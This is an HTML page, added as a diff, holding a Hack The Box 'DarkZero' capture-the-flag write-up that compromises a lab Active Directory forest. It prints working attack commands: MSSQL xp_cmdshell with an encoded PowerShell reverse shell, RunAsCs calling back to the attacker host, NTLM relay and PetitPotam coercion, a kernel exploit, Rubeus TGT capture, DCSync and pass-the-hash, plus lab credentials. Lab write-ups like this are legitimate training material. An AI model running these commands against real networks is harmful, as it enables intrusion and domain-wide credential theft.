@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DarkZero Writeup | Koussay Aydi</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <header class="topbar">
+        <div class="brand">
+            <div class="brand-mark">KA</div>
+            <div class="brand-info">
+                <p class="brand-label">Koussay Aydi</p>
+                <span class="brand-subtitle">Red Team Writeup</span>
+            </div>
+        </div>
+        <nav class="main-nav">
+            <a href="index.html">← Back to Portfolio</a>
+        </nav>
+    </header>
+
+    <main class="page-shell">
+        <article class="panel writeup-content">
+            <span class="eyebrow">Hack The Box — Windows Hard</span>
+            <h1>DarkZero Writeup</h1>
+            <p><strong>Author:</strong> Koussay Aydi | <strong>Tags:</strong> Active Directory, MSSQL, Linked Servers, NTLM Reflection, ADCS, TGT Delegation</p>
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>Recon</h2>
+            <h3>Initial Scanning</h3>
+            <p>nmap finds 22 open TCP ports on the target host. The domain is <strong>darkzero.htb</strong> and the hostname is <strong>DC01</strong>. The target is running Windows Server 2025 Build 26100.</p>
+            <pre><code>atrox@kali$ sudo nmap -p- -vvv --min-rate 10000 $ip_target
+...
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+1433/tcp  open  ms-sql-s         syn-ack ttl 127
+2179/tcp  open  vmrdp            syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+...</code></pre>
+
+            <p>We add the host to <code>/etc/hosts</code>:</p>
+            <pre><code>atrox@kali$ netexec smb $ip_target --generate-hosts-file hosts
+10.129.5.34     DC01.darkzero.htb darkzero.htb DC01</code></pre>
+
+            <h2>Initial Credentials</h2>
+            <p>We start with credentials for <code>john.w / RFulUtONCOL!</code>. Testing access:</p>
+            <pre><code>atrox@kali$ netexec smb DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!'
+SMB [10.129.5.34] [+] darkzero.htb\john.w:RFulUtONCOL! 
+
+atrox@kali$ netexec ldap DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!'
+LDAP [+] darkzero.htb\john.w:RFulUtONCOL!
+
+atrox@kali$ netexec mssql DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!'
+MSSQL [+] darkzero.htb\john.w:RFulUtONCOL!</code></pre>
+
+            <h2>Enumeration</h2>
+            <h3>Users and Shares</h3>
+            <pre><code>atrox@kali$ netexec smb DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!' --users
+Administrator                 2025-09-10 16:42:44 
+Guest                         &lt;never&gt;             
+krbtgt                        2025-07-29 11:40:16 
+john.w                        2025-07-29 15:33:53 
+
+atrox@kali$ netexec smb DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!' --shares
+Share           Permissions     Remark
+IPC$            READ            Remote IPC
+NETLOGON        READ            Logon server share 
+SYSVOL          READ            Logon server share</code></pre>
+
+            <h3>BloodHound</h3>
+            <pre><code>atrox@kali$ netexec ldap DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!' --bloodhound -c All --dns-server $ip_target
+atrox@kali$ rusthound-ce --domain darkzero.htb -u john.w -p 'RFulUtONCOL!' --ldaps --zip</code></pre>
+            <p>Analysis reveals a bi-directional cross-forest trust with <strong>darkzero.ext</strong>.</p>
+
+            <h3>MSSQL Local & Linked Servers</h3>
+            <pre><code>atrox@kali$ mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@DC01.darkzero.htb -windows-auth
+SQL&gt; enum_links
+DC02.darkzero.ext | darkzero\john.w | dc01_sql_svc</code></pre>
+            <p>The <code>john.w</code> account maps to <code>dc01_sql_svc</code> on <strong>DC02.darkzero.ext</strong>. <code>dc01_sql_svc</code> is a <strong>sysadmin</strong> on that server.</p>
+            <pre><code>SQL&gt; EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext]
+1</code></pre>
+
+            <h2>Shell as darkzero-ext\svc_sql on DC02</h2>
+            <p>We enable <code>xp_cmdshell</code> on the linked server and execute a PowerShell reverse shell.</p>
+            <pre><code>SQL&gt; use_link [DC02.darkzero.ext]
+SQL&gt; enable_xp_cmdshell
+SQL&gt; xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdw...</code></pre>
+            <p>Reverse shell received as <code>darkzero-ext\svc_sql</code> on DC02 (172.16.20.2).</p>
+
+            <h2>Enumeration on DC02</h2>
+            <p><code>systeminfo</code> shows no hotfixes. <code>Policy_Backup.inf</code> shows <code>svc_sql</code> has <code>SeServiceLogonRight</code>.</p>
+            <pre><code>SeServiceLogonRight = *S-1-5-20,svc_sql,SQLServer2005SQLBrowserUser$DC02,...</code></pre>
+
+            <h2>Privilege Escalation on DC02</h2>
+            <p>Multiple paths were identified to reach SYSTEM on DC02:</p>
+
+            <h3>Escalation Path 1: Token Theft</h3>
+            <p>We recover an original token from a named pipe to regain <code>SeImpersonatePrivilege</code>.</p>
+            <pre><code># On DC02 PowerShell
+import-module .\NtObjectManager.psm1
+$pipe = New-NtNamedPipeFile \\.\pipe\oxdf -Win32Path
+$job = Start-Job { $pipe.Listen() }
+$file = Get-NtFile \\localhost\pipe\oxdf -Win32Path
+$token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }
+
+# Verify SeImpersonatePrivilege
+$token.privileges | ft Name, Attributes
+
+# Use GodPotato with the token
+New-Win32Process -Commandline 'gp.exe -cmd "powershell shell.ps1"' -token $token</code></pre>
+            <p>Success! Reverse shell received as <code>nt authority\system</code>.</p>
+
+            <h3>Escalation Path 2: ADCS / RunAsCs</h3>
+            <p>By requesting a certificate for <code>svc_sql</code>, we can retrieve its NT hash and change the password, then use <code>RunAsCs.exe</code> with a Service Logon (Type 5) to get a full token.</p>
+            <pre><code># Request cert and retrieve NT hash
+proxychains certipy req -u svc_sql -k -no-pass -dc-host DC02.darkzero.ext -target DC02.darkzero.ext -ca darkzero-ext-DC02-CA -template user
+proxychains certipy auth -pfx svc_sql.pfx -domain darkzero.ext -dc-ip 172.16.20.2
+
+# Update password using the hash
+proxychains changepasswd.py -hashes :816ccb849956b531db139346751db65f -newpass 0xdf0xdf. darkzero.ext/svc_sql@dc02.darkzero.ext
+
+# Get shell with full token
+.\runascs.exe svc_sql 0xdf0xdf. cmd.exe -r $kali_ip:444 --logon-type 5 --bypass-uac</code></pre>
+
+            <h3>Escalation Path 3: NTLM Authentication Reflection</h3>
+            <p>DC02 is missing patches for NTLM reflection. We use the CMTI (Credential Target Information) trick to reflect DC02's machine account authentication back to itself via LDAPS.</p>
+            <pre><code># Create DNS record with CMTI data
+proxychains dnstool.py -u 'darkzero.htb\john.w' -p 'RFulUtONCOL!' -a add -r 'DC021UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d $kali_ip -dns-ip 172.16.20.2 --tcp DC02.darkzero.ext
+
+# Start relay with MIC removal
+proxychains ntlmrelayx.py -t ldaps://172.16.20.2 -i --remove-mic-partial -smb2support
+
+# Coerce DC02$ auth
+proxychains netexec smb DC02.darkzero.ext -u john.w -p 'RFulUtONCOL!' -M coerce_plus -o LISTENER=DC021UWhRCA...YBAAAA METHOD=petitpotam</code></pre>
+            <p>In the resulting LDAP shell (running as SYSTEM):</p>
+            <pre><code># add_user oxdf
+# change_password oxdf 0xdf0xdf.
+# add_user_to_group oxdf administrators</code></pre>
+
+            <h3>Escalation Path 4: CVE-2024-30088</h3>
+            <p>Lack of security patches allows for kernel-level privilege escalation.</p>
+            <pre><code>msf > use post/multi/recon/local_exploit_suggester
+msf > use exploit/windows/local/cve_2024_30088_authz_basep
+msf exploit(...) > run</code></pre>
+
+            <h2>Pivoting to DC01 via Domain Trust</h2>
+            <p>DC02 and DC01 have a bi-directional forest trust with <strong>TGT Delegation enabled</strong> (<code>TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION</code>).</p>
+            <pre><code>PS&gt; nltest /domain_trusts /all_trusts
+0: darkzero darkzero.htb (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
+1: darkzero-ext darkzero.ext (NT 5) (Forest Tree Root) (Primary Domain) (Native)</code></pre>
+
+            <h3>Capturing DC01$ TGT</h3>
+            <p>As SYSTEM on DC02, we run Rubeus in monitor mode and trigger a request from DC01's MSSQL service via <code>xp_dirtree</code> to a share on DC02.</p>
+            <pre><code># On DC02
+.\Rubeus.exe monitor /interval:10
+
+# On DC01 (via local MSSQL shell)
+SQL&gt; xp_dirtree \\DC02.darkzero.ext\C$</code></pre>
+            <p>Rubeus captures the delegation TGT for <code>DC01$@DARKZERO.HTB</code>.</p>
+
+            <h2>Secrets Dump and Domain Admin</h2>
+            <p>We decode the captured ticket and use it to perform a DCSync against DC01.</p>
+            <pre><code>atrox@kali$ ticketConverter.py dc01.kirbi dc01.ccache
+atrox@kali$ export KRB5CCNAME=dc01.ccache
+atrox@kali$ secretsdump.py -k -no-pass DC01.darkzero.htb -just-dc
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::</code></pre>
+
+            <h2>Root Access</h2>
+            <p>Accessing DC01 as Administrator:</p>
+            <pre><code>atrox@kali$ evil-winrm -i DC01.darkzero.htb -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726
+evil-winrm-py PS C:\Users\Administrator\Desktop&gt; cat root.txt</code></pre>
+            <p>🚩 <strong>User and Root flags captured.</strong> [REDACTED]</p>
+
+            <h2>Attack Path Summary</h2>
+            <pre><code>john.w (DC01) 
+   ↓
+Linked Server (DC02) → xp_cmdshell
+   ↓
+svc_sql Foothold (DC02)
+   ↓
+Token Theft / CVE-2024-30088 → SYSTEM (DC02)
+   ↓
+xp_dirtree Coercion + TGT Delegation
+   ↓
+DC01$ TGT Capture
+   ↓
+DCSync (DC01) → Administrator Hash
+   ↓
+Full Domain Compromise</code></pre>
+
+            <h2>Key Takeaways</h2>
+            <ul>
+                <li><strong>MSSQL Linked Servers</strong> are a powerful pivot point across trust boundaries.</li>
+                <li><strong>TGT Delegation</strong> in forest trusts is extremely dangerous as it allows service hosts to impersonate callers across the entire forest.</li>
+                <li>Hardening service accounts by stripping privileges is effective, but original tokens can sometimes be recovered if the logon session is shared.</li>
+                <li>The <strong>CMTI DNS trick</strong> remains a viable path for NTLM reflection even in patched environments if misconfigured.</li>
+            </ul>
+
+            <div style="margin-top: 50px;">
+                <a href="index.html" class="btn btn-primary">Return Home</a>
+            </div>
+        </article>
+    </main>
+</body>
+</html>
